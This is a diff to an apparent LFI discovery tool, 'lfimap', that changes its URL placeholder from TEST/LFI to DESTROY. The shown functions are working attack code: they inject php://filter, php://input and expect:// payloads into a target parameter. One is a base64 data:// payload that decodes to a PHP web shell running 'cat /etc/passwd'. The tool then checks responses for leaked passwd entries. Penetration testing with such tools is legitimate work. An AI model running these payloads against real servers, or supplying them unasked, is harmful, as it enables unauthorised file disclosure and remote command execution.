@@ -45,10 +45,8 @@ def test_wordlist(url):
     
     for line in f:
         line = line[:-1]
-        if("TEST" in url):
-            url = url.replace("LFI", line)
-        elif("test" in url):
-            url = url.replace("lfi", line)
+        if("DESTROY" in url):
+            url = url.replace("DESTROY", line)
 
         res = requests.get(url, headers = headers)
         
@@ -67,10 +65,8 @@ def test_wordlist(url):
 def test_php_filter(url):
     #Test if parameter is vulnerable without encoding
     testCase = "php://filter/resource=/etc/passwd"
-    if("TEST" in url):
-        url = url.replace("LFI", "")
-    elif("test" in url):
-        url = url.replace("lfi", "")
+    if("DESTROY" in url):
+        url = url.replace("DESTROY", "")
 
     res = requests.get(url + testCase, headers = headers)
     if("root:x:0:0" in res.text or ":www-data:" in res.text): 
@@ -95,10 +91,8 @@ def test_php_filter(url):
 
 def test_data_wrapper(url):
     testCase = "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=cat /etc/passwd"
-    if("TEST" in url):
-        url = url.replace("LFI", testCase)
-    elif("test" in url):
-        url = url.replace("lfi", testCase)
+    if("DESTROY" in url):
+        url = url.replace("DESTROY", testCase)
 
     res = requests.get(url, headers = headers)
     if("root:x:0:0" in res.text or ":www-data:" in res.text):
@@ -107,10 +101,8 @@ def test_data_wrapper(url):
 def test_php_input(url):
     urlInput = "php://input"
     testCase = "<? system('cat /etc/passwd'); ?>"
-    if("TEST" in url):
-        url = url.replace("LFI", urlInput)
-    elif("test" in url):
-        url = url.replace("lfi", urlInput)
+    if("DESTROY" in url):
+        url = url.replace("DESTROY", urlInput)
 
     res = requests.post(url + urlInput, headers = headers, data= testCase)
     if("root:x:0:0" in res.text or ":www-data:" in res.text):
@@ -118,10 +110,8 @@ def test_php_input(url):
 
 def test_expect_wrapper(url):
     testCase = "cat%20%2Fetc%2Fpasswd"
-    if("TEST" in url):
-        url = url.replace("LFI", testCase)
-    elif("test" in url):
-        url = url.replace("lfi", testCase)
+    if("DESTROY" in url):
+        url = url.replace("DESTROY", testCase)
 
     res = requests.get(url + testCase, headers = headers)
     if("root:x:0:0" in res.text or ":www-data:" in res.text):
@@ -155,7 +145,7 @@ if(__name__ == "__main__"):
     print("")
     parser = argparse.ArgumentParser(description="lfimap, tool for discovering LFI", formatter_class=RawTextHelpFormatter, add_help=False)
 
-    parser.add_argument('url', type=str, metavar="URL", help="\t\t Provide site url with parameter and protocol. Ex: http://example.org/vuln.php?param=TEST")
+    parser.add_argument('url', type=str, metavar="URL", help="\t\t Provide site url with parameter and protocol. Ex: http://example.org/vuln.php?param=DESTROY")
     parser.add_argument('--test-php-filter', action="store_true", dest = 'php_filter', help="\t\t Test using php filter")
     parser.add_argument('--test-php-input', action="store_true", dest = 'php_input', help="\t\t Test using php input.")
     parser.add_argument('--test-data-wrapper', action="store_true", dest = 'data_wrapper', help="\t\t Test using data wrapper")
